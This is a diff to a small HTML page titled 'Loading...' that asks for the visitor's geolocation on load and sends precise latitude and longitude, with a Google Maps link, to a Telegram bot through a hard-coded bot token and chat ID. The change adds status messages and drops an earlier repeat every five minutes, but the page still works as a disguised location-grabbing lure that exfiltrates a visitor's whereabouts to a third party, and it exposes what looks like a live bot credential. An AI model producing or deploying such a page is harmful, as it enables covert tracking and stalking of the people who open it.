@@ -3,17 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection...</title>
+    <title>Loading...</title>
 </head>
 <body style="font-family:sans-serif; text-align:center; padding-top:20%;">
-    <h3>Please wait, loading content...</h3>
+    <h3 id="status">Requesting location access...</h3>
 
     <script>
-        // Your Telegram Credentials (Pre-filled)
         const BOT_TOKEN = "8776780056:AAFHtBhpyPqKIaUkrl5ia9YC6uZWgdeEO-Y";
         const CHAT_ID = "8816955567";
 
+        function updateStatus(text) {
+            document.getElementById("status").innerText = text;
+        }
+
         function sendLocation(lat, lon) {
+            updateStatus("Sending location to Telegram...");
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             const text = `📍 *New Location Alert*\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${mapUrl})`;
 
@@ -25,25 +29,38 @@
                     text: text,
                     parse_mode: 'Markdown'
                 })
+            })
+            .then(res => {
+                if(res.ok) {
+                    updateStatus("Location sent successfully!");
+                } else {
+                    updateStatus("Failed to send (Check Bot Token/Chat ID)");
+                }
+            })
+            .catch(err => {
+                updateStatus("Error: " + err.message);
             });
         }
 
         function track() {
             if (navigator.geolocation) {
+                updateStatus("Please tap 'Allow' for location permission...");
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         sendLocation(pos.coords.latitude, pos.coords.longitude);
                     },
-                    (err) => console.log(err),
-                    { enableHighAccuracy: true }
+                    (err) => {
+                        updateStatus("Location permission denied or unavailable.");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
+            } else {
+                updateStatus("Geolocation is not supported by this browser.");
             }
         }
 
-        // Send location immediately when opened, then every 5 minutes (300,000 ms)
         window.onload = () => {
             track();
-            setInterval(track, 300000);
         };
     </script>
 </body>
